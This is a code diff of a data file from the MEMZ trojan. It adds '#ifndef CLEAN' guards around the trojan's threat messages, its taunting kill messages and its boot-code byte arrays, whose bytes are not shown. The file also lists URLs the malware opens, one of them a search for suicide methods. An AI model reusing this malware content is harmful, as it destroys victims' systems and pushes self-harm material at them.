@@ -1,6 +1,8 @@
 #include "data.h"
 
+#ifndef CLEAN
 const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
+#endif
 
 const char *sites[] = {
 	"https://google.co.ck/search?q=best+way+to+kill+yourself",
@@ -41,6 +43,7 @@ const char *sites[] = {
 
 const size_t nSites = sizeof(sites) / sizeof(void *);
 
+#ifndef CLEAN
 const char *msgs[] = {
 	"YOU KILLED MY TROJAN!\r\nNow you are going to die.",
 	"REST IN PISS, FOREVER MISS.",
@@ -65,6 +68,7 @@ const char *msgs[] = {
 };
 
 const size_t nMsgs = sizeof(msgs) / sizeof(void *);
+#endif
 
 const char *sounds[] = {
 	"SystemHand",
@@ -74,6 +78,8 @@ const char *sounds[] = {
 
 const size_t nSounds = sizeof(sounds) / sizeof(void *);
 
+
+#ifndef CLEAN
 // Split into 2 parts to save some space.
 
 const unsigned char code1[] = {
@@ -274,3 +280,4 @@ const unsigned char code2[] = {
 const size_t code1_len = sizeof(code1);
 const size_t code2_len = sizeof(code2);
 const size_t msg_len = sizeof(msg);
+#endif
